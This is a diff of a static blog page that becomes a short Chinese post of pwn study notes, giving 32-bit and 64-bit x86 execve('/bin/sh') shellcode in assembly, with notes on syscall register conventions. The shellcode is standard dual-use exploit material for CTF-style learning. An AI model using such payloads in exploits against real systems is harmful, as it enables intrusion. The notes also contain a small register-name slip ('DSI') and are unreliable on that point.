@@ -16,21 +16,38 @@
   <meta name="author" content="Cheer">
   <meta name="keywords" content="">
   
-    <meta name="description" content="UCASCheer">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Categories">
-<meta property="og:url" content="http://example.com/categories/index.html">
+    <meta name="description" content="32位shellcode: 12345678xor    ecx,ecx;mul    ecx;push   ecx;push   0x68732f2f;push   0x6e69622f;mov    ebx,esp;mov    al,0xb;int    0x80;  32位机器的系统调用，调用号在EAX，前面的参数依次在EBX, ECX, EDX 其中，mul ecx;指令的作用为EDX:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UCASCheer">
+<meta property="og:url" content="http://example.com/2022/04/13/Pwn%E7%AC%94%E8%AE%B0%20shellcode%E7%9A%84%E6%9E%84%E5%BB%BA/index.html">
 <meta property="og:site_name" content="UCASCheer">
-<meta property="og:description" content="UCASCheer">
+<meta property="og:description" content="32位shellcode: 12345678xor    ecx,ecx;mul    ecx;push   ecx;push   0x68732f2f;push   0x6e69622f;mov    ebx,esp;mov    al,0xb;int    0x80;  32位机器的系统调用，调用号在EAX，前面的参数依次在EBX, ECX, EDX 其中，mul ecx;指令的作用为EDX:">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-04-13T02:53:23.701Z">
+<meta property="article:modified_time" content="2022-04-13T03:30:16.135Z">
 <meta property="article:author" content="Cheer">
 <meta name="twitter:card" content="summary_large_image">
   
   
-  <title>Categories - UCASCheer</title>
+  <title>UCASCheer</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
 
 
 <!-- 主题依赖的图标库，不要自行修改 -->
@@ -57,7 +74,7 @@
 
 
 <body>
-  <header style="height: 60vh;">
+  <header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand" href="/">
@@ -158,9 +175,43 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Category">
+            <span class="h2" id="subtitle" title="">
               
             </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-04-13 10:53" pubdate>
+        April 13, 2022 am
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      427 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      4 分钟
+    </span>
+  
+
+  
+  
+</div>
 
             
           </div>
@@ -173,66 +224,94 @@
 
   <main>
     
-      <div class="container nopadding-x-md">
-        <div class="py-5" id="board"
-          >
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-
-
-
-
-<div class="category-list">
-  
-  
-  
-  
-    
-    
-    <div class="category row">
-      <a
-        class="category-item collapsed list-group-item category-item-action col-10 col-md-11"
-        id="heading-e9e0ffb077470c58e4bd3a64b05ca5f4" role="tab" data-toggle="collapse" href="#collapse-e9e0ffb077470c58e4bd3a64b05ca5f4"
-        aria-expanded="false"
-      >
-        课程随笔
-        <i class="iconfont icon-arrowright"></i>
-      </a>
-      <a href="/categories/%E8%AF%BE%E7%A8%8B%E9%9A%8F%E7%AC%94/" class="category-count col-2 col-md-1">
-        <i class="iconfont icon-articles"></i>
-        <span>1</span>
-      </a>
-      <div class="category-collapse collapse" id="collapse-e9e0ffb077470c58e4bd3a64b05ca5f4" role="tabpanel" aria-labelledby="heading-e9e0ffb077470c58e4bd3a64b05ca5f4">
-        
-        
-          
-  <div class="category-post-list">
-    
-    
       
-      
-        <a href="/2022/04/12/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AE%B0%E5%BD%95%EF%BC%9A%E5%9F%BA%E4%BA%8ELLVMClang%E7%BC%96%E8%AF%91%E5%99%A8%E4%BD%BF%E7%94%A8%E5%8F%8A%E7%BC%96%E8%AF%91%E6%96%B9%E6%A1%88%E4%BC%98%E5%8C%96/" class="list-group-item list-group-item-action">
-          <span class="category-post">编译原理记录：基于LLVM/Clang编译器使用及编译方案优化</span>
-        </a>
-      
-    
-  </div>
 
-        
-      </div>
-    </div>
-  
-</div>
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none"></h1>
+            
+            <div class="markdown-body">
+              <p>32位shellcode:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><pre><code class="hljs assembly">xor    ecx,ecx;<br>mul    ecx;<br>push   ecx;<br>push   0x68732f2f;<br>push   0x6e69622f;<br>mov    ebx,esp;<br>mov    al,0xb;<br>int    0x80;<br></code></pre></td></tr></table></figure>
 
-              </div>
+<p>32位机器的系统调用，调用号在EAX，前面的参数依次在EBX, ECX, EDX</p>
+<p>其中，<code>mul ecx;</code>指令的作用为<code>EDX:EAX &lt;-- EAX * r/m32</code>，将EDX和EAX清零。</p>
+<p>64位shellcode：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor     rdx, rdx<br>mov     qword rbx, &#x27;//bin/sh&#x27;<br>shr     rbx, 0x8<br>push    rbx<br>mov     rdi, rsp<br>push    rax<br>push    rdi<br>mov     rsi, rsp<br>mov     al, 0x3b<br>syscall<br></code></pre></td></tr></table></figure>
+
+<p>64位机器系统调用，调用号在RAX，前面的参数依次在RDI, DSI, RDX, RCX</p>
+<p>假设开始时rax为零了</p>
+<p>且rcx为零不需要保证</p>
+<p>使用pwntools可以把其中的AT&amp;T转换成intel风格。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly"><br></code></pre></td></tr></table></figure>
+
+
             </div>
-          </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/04/14/Pwn%E7%AC%94%E8%AE%B0%20%E9%A2%98%E7%9B%AE%E7%9A%84docker%E9%83%A8%E7%BD%B2/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/04/12/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AE%B0%E5%BD%95%EF%BC%9A%E5%9F%BA%E4%BA%8ELLVMClang%E7%BC%96%E8%AF%91%E5%99%A8%E4%BD%BF%E7%94%A8%E5%8F%8A%E7%BC%96%E8%AF%91%E6%96%B9%E6%A1%88%E4%BC%98%E5%8C%96/">
+                        <span class="hidden-mobile">编译原理记录：基于LLVM/Clang编译器使用及编译方案优化</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
         </div>
       </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
     
 
     
@@ -315,6 +394,19 @@
   
 
 
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
 
 
 
